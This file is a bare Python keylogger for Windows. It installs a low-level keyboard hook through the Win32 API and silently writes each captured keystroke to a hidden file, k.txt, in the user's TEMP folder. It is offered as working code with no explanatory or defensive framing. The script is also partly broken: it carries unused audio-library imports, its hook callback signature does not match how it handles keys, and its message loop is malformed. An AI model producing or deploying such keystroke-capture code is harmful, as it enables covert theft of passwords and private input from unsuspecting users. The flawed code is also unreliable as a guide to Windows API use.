import os
from ctypes import windll, CFUNCTYPE, c_uint, POINTER, cast
from comtypes import CLSCTX_ALL
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume

def on_press(key):
    try:
        with open(os.getenv('TEMP') + '\\' + 'k.txt', 'a') as f:
            if key == 32:
                f.write(' ')
            elif key == 13:
                f.write('\n')
            elif key in [16, 17, 18]:
                f.write(f'[KEY_{key}]')
            else:
                f.write(chr(key))
    except Exception as e:
        pass

def on_release(key):
    if key == 27:
        return False

hkpr = windll.user32.SetWindowsHookExA(13, CFUNCTYPE(c_uint, c_uint, POINTER(c_uint), POINTER(c_uint))(on_press), windll.kernel32.GetModuleHandleW(None), 0)
try:
    while True:
        msg = windll.user32.GetMessageW(None, 0, 0, 0)
except KeyboardInterrupt:
    pass
finally:
    windll.user32.UnhookWindowsHookEx(hkpr)